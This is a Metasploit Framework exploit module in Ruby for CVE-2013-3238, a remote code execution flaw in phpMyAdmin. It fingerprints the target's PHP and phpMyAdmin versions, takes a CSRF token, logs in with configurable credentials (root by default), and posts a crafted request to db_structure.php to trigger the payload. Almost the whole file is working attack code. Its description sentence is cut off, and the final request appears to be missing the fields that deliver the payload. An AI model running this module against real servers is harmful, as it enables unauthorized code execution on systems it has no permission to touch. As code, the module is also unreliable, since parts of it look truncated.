# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Description&#039; => %q{
          This module exploits a PREG_REPLACE_EVAL vulnerability in phpMyAdmin&#039;s
          This affects versions 3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3.
          PHP versions > 5.4.6 are not vulnerable.
      },
      &#039;Author&#039; =>
        [
          &#039;Janek "waraxe" Vind&#039;, # Discovery
          &#039;Ben Campbell <eat_meatballs[at]hotmail.co.uk>&#039; # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [ &#039;CVE&#039;, &#039;2013-3238&#039; ],
          [ &#039;PMASA&#039;, &#039;2013-2&#039;],
          [ &#039;waraxe&#039;, &#039;2013-SA#103&#039; ],
          [ &#039;EDB&#039;, &#039;25003&#039;],
          [ &#039;OSVDB&#039;, &#039;92793&#039;],
          [ &#039;URL&#039;, &#039;http://www.waraxe.us/advisory-103.html&#039; ],
          [ &#039;URL&#039;, &#039;http://www.phpmyadmin.net/home_page/security/PMASA-2013-2.php&#039; ]
        ],
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Payload&#039;    =>
        {
          &#039;BadChars&#039; => "&\n=+%",
          # Clear out PMA&#039;s error handler so it doesn&#039;t lose its mind
          # and cause ENOMEM errors and segfaults in the destructor.
          &#039;Prepend&#039; => "function foo($a,$b,$c,$d,$e){return true;};set_error_handler(foo);"
        },
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Apr 25 2013&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base phpMyAdmin directory path", &#039;/phpmyadmin/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;root&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", &#039;&#039;])
      ], self.class)
  end

  def check
    begin
      res = send_request_cgi({ &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/js/messages.php&#039;) })
    rescue
      print_error("Unable to connect to server.")
      return CheckCode::Unknown
    end

    if res.code != 200
      print_error("Unable to query /js/messages.php")
      return CheckCode::Unknown
    end

    php_version = res[&#039;X-Powered-By&#039;]
    if php_version
      print_status("PHP Version: #{php_version}")
      if php_version =~ /PHP\/(\d)\.(\d)\.(\d)/
        if $1.to_i > 5
          return CheckCode::Safe
        else
          if $1.to_i == 5 and $2.to_i > 4
            return CheckCode::Safe
          else
            if $1.to_i == 5 and $2.to_i == 4 and $3.to_i > 6
              return CheckCode::Safe
            end
          end
        end
      end
    else
      print_status("Unknown PHP Version")
    end

    if res.body =~ /pmaversion = &#039;(.*)&#039;;/
      print_status("phpMyAdmin version: #{$1}")
      case $1.downcase
        when &#039;3.5.8.1&#039;, &#039;4.0.0-rc3&#039;
          return CheckCode::Safe
        when &#039;4.0.0-alpha1&#039;, &#039;4.0.0-alpha2&#039;, &#039;4.0.0-beta1&#039;, &#039;4.0.0-beta2&#039;, &#039;4.0.0-beta3&#039;, &#039;4.0.0-rc1&#039;, &#039;4.0.0-rc2&#039;
          return CheckCode::Vulnerable
        else
          if $1.starts_with? &#039;3.5.&#039;
            return CheckCode::Vulnerable
          end

          return CheckCode::Unknown
      end
    end
  end

  def exploit
    uri = target_uri.path
    print_status("Grabbing CSRF token...")
    response = send_request_cgi({ &#039;uri&#039; => uri})
    if response.nil?
      fail_with(Exploit::Failure::NotFound, "Failed to retrieve webpage.")
    end

    if (response.body !~ /"token"\s*value="([^"]*)"/)
      fail_with(Exploit::Failure::NotFound, "Couldn&#039;t find token. Is URI set correctly?")
    else
      print_good("Retrieved token")
    end

    token = $1
    post = {
      &#039;token&#039; => token,
      &#039;pma_username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;pma_password&#039; => datastore[&#039;PASSWORD&#039;]
    }

    print_status("Authenticating...")

    login = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_post&#039; => post
    })

    if login.nil?
      fail_with(Exploit::Failure::NotFound, "Failed to retrieve webpage.")
    end

    token = login.headers[&#039;Location&#039;].scan(/token=(.*)[&|$]/).flatten.first

    cookies = login.get_cookies

    login_check = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039; => { &#039;token&#039; => token },
      &#039;cookie&#039; => cookies
    })

    if login_check.body =~ /Welcome to/
      fail_with(Exploit::Failure::NoAccess, "Authentication failed.")
    else
      print_good("Authentication successful")
    end

    db = rand_text_alpha(3+rand(3))
    exploit_result = send_request_cgi({
      &#039;uri&#039;  => normalize_uri(uri, &#039;db_structure.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
      &#039;vars_post&#039; => {
        &#039;db&#039; => db,
        &#039;selected[0]&#039; => db,
        &#039;token&#039; => token,
        &#039;mult_btn&#039; => &#039;Yes&#039;
      }
    },1)
  end
end

